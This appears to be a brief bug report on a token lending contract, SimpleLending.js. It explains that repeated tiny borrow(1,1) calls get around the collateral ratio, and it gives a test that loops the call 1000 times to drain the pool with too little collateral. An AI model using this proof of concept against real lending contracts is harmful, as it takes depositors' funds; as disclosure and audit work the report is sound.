In SimpleLending.js you can repeatedly do borrow(1,1) to borrow 1 tokenB for 1 tokenA of collateral with the default parameters in the test cases. so you can just borrow 1 at a time multiple times and they can't liquidate you for any extra collateral

normally in the test case you need 1500 collateral tokenB to borrow 1000 tokenA
otherwise you can just do this and borrow it all with only 1000 tokenB

it("Should liquidate loan after maturity", async function () {
        await tokenA.connect(owner).approve(await lending.getAddress(), 1000);
        await lending.connect(owner).deposit(1000);

        await tokenB.connect(owner).transfer(borrower.address, 1000);
        await tokenB.connect(borrower).approve(await lending.getAddress(), 1000);
        for (let i = 0; i < 1000; i++)
        {
            await lending.connect(borrower).borrow(1,1);
        }
        expect(await tokenA.balanceOf(borrower.address)).to.be.equal(1000);
    });
